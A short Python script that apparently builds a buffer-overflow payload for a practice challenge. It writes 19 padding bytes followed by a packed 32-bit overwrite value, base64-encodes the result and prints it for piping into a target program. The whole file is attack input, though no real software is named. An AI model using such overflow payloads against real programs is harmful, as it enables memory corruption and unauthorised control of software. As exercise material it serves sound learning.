
import sys
import struct
import base64

buf = b'FFFFFFFFFFFFFFFFFFF'
buf += struct.pack('<I', 2042399582)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
